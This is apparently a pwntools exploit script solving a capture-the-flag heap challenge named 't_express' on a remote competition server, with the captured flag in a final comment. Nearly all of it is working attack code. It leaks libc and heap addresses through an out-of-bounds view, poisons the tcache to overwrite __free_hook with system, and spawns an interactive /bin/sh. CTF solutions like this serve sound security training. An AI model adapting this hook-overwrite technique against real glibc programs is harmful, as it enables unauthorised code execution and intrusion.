from pwn import * 

local = 0

if local == 1:
    p = process("./t_express")
    # free_hook_offset = 0x1e75a8
    # one_gadget = [0xe237f,0xe2383,0xe2386,0x106ef8]
    # leak_offset = 0x1E5703
    free_hook_offset = 0x1eeb28
    malloc_hook_offset = 0x1ebb70
    system_offset = 0x55410
    one_gadget = [0xe6ce3,0xe6ce6,0xe6ce9]
    leak_offset = 0x1ec643
else :
    p = remote("t-express.sstf.site", 1337)
    free_hook_offset = 0x1eeb28
    system_offset = 0x55410
    leak_offset = 0x1ec643


def buy(idx,fn,ln):
    p.sendlineafter("choice:",str(1))    
    p.sendlineafter("(1/2):",str(idx))
    p.sendlineafter("name:",fn)
    p.sendlineafter("name:",ln)
    
def view(idx):
    p.sendlineafter("choice:",str(2))
    p.sendlineafter("ticket:",str(idx))
    
def use(idx,type):
    p.sendlineafter("choice:",str(3))
    p.sendlineafter("ticket:",str(idx))
    if(type != 0) :
        p.sendlineafter("(1/2/3/4):",str(type))

view(-4)
p.recvuntil("|name |")
recv = p.recvuntil("|")

libc_base = u64(recv[-8:-2]+"\x00\x00")-leak_offset
free_hook = libc_base+free_hook_offset
# one = libc_base+one_gadget[2]
system = libc_base + system_offset

log.info(hex(libc_base))

buy(1,"aa","a"*8) #0
buy(1,"aa","a"*7) #1
buy(1,"aa","\x20") #2
use(2,0)
use(1,0)

view(1)

p.recvuntil("|name |")
recv = p.recvuntil("|")

heap = u64(recv[-8:-2]+"\x00\x00")+0x2a0+0x40

use(0,4)
use(1,0)

buy(1,p64(free_hook),"\xcc"*8)
buy(1,"/bin/sh","a"*7)

buy(1,p64(system),"\xdd"*8)
pause()
use(1,0)

p.interactive()
#SCTF{D1d_y0u_$ee_7he_7c4che_key}